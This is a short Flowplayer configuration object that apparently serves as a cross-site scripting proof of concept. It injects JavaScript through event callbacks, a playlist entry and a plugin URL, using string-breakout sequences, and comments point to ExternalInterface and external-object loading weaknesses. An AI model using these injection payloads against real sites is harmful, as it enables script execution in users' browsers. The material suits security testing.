{
	'log' : {
		'level'  : 'info'
	},
	'clip': {
		'autoPlay': 'true',
		'baseUrl': 'http://stream.flowplayer.org/', /* Can load external objects - ExternalInterface issue */
		'onMyConnectionEvent': 'function(clip, info) {alert(document.domain)};', 
		'onStart': 'function() {alert(document.domain);}' 
	},
	'playlist': [ 
		'\\\"))}catch(e){};alert(document.domain);//' 
	],
	'plugins': { 
		'controls': { 
			'url': 'http://cache.addthiscdn.com/downloads/demo/flash/latest/helloworld_icons.swf?\\\"))}catch(e){};alert(document.domain);//' /* External object loading issue */
		}
	},
	'onLoad': 'function() {alert(/onLoad/);}', 
	'connectionCallbacks': [ "onMyConnectionEvent" ] 
}
